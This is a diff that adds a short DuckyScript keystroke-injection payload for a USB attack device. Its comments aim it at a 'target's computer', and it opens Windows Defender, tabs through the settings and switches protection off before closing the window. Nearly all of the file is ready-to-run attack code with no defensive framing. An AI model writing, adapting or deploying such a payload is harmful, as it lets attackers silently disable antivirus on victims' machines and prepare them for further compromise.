@@ -1,0 +1,31 @@
+REM /!\ You may adapt the DELAY value according to the target's computer speed
+GUI d
+DELAY 200
+REM * Opening Windows Defender *
+GUI
+DELAY 300
+STRING windows defender
+DELAY 300
+REM * Taking the way to disable it *
+ENTER
+DELAY 3500
+ENTER
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 300
+REM * Disabling Windows Defender *
+SPACE
+DELAY 500
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 300
+ALT f4
